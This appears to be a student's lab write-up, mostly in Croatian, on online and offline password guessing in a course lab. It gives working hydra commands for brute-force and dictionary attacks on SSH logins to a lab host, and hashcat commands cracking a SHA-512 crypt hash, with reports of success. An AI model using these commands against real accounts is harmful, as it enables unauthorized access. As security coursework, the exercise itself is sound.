# Lab 6: Online and Offline Password Guessing

## Online Password Guessing:

Potrebna nmap aplikacija (Nmap is short for Network Mapper. It is **an open-source Linux command-line tool that is used to scan IP addresses and ports in a network and to detect installed applications**.)

Ona nam skenira sve IP adrese na mreži

Dalje na svojoj dediciranoj mašini otvaramo remote shell

```python
ssh lasic_vedran@lasicvedran.local
```

![Untitled](Lab%206%20Online%20and%20Offline%20Password%20Guessing%2012f4574f348a433496eb616776298c18/Untitled.png)

Za naš Online Password Guessing napad trebamo instalirati i hydra aplikaciju (Hydra is commonly used by **penetration testers together with a set of programmes like crunch, cupp etc, which are used to generate wordlists**. Hydra is then used to test the attacks using the wordlists that these programmes created.)

Znamo da je lozinka duga 4-6 znakova i čine ju mala slova pa ima 26^4+26^5+26^6 (**321254128)** mogućnosti koje bi hydra trebala probati

```python
hydra -l lasic_vedran -x 4:6:a lasicvedran.local -V -t 4 ssh
```

Zato ćemo koristiti dictionary

```python
hydra -l doe_john -P dictionary/g3/dictionary_online.txt lasicvedran.local -V -t 4 ssh
```

![Hydra je pronašla točnu lozinku](Lab%206%20Online%20and%20Offline%20Password%20Guessing%2012f4574f348a433496eb616776298c18/Untitled%201.png)

Hydra je pronašla točnu lozinku

![Untitled](Lab%206%20Online%20and%20Offline%20Password%20Guessing%2012f4574f348a433496eb616776298c18/Untitled%202.png)

## Offline Password Guessing:

Potreban nam je hashcat alat (Hashcat is **a password cracking tool used for licit and illicit purposes**. Hashat is a particularly fast, efficient, and versatile hacking tool that assists brute-force attacks by conducting them with hash values of passwords that the tool is guessing or applying.)

![Hashirana šifra koju napadamo](Lab%206%20Online%20and%20Offline%20Password%20Guessing%2012f4574f348a433496eb616776298c18/Untitled%203.png)

Hashirana šifra koju napadamo

Sada znamo da je šifra 6 znakova malih slova:

```python
hashcat --force -m 1800 -a 3 hash.txt ?l?l?l?l?l?l --status --status-timer 10
```

![Untitled](Lab%206%20Online%20and%20Offline%20Password%20Guessing%2012f4574f348a433496eb616776298c18/Untitled%204.png)

Opet ćemo koristiti dictionary

```python
hashcat --force -m 1800 -a 0 password_hash.txt dictionary/g3/dictionary_offline.txt --status --status-timer 10
```

![Untitled](Lab%206%20Online%20and%20Offline%20Password%20Guessing%2012f4574f348a433496eb616776298c18/Untitled%205.png)

Uspješno smo našli lozinku john_doe-a!

![Untitled](Lab%206%20Online%20and%20Offline%20Password%20Guessing%2012f4574f348a433496eb616776298c18/Untitled%206.png)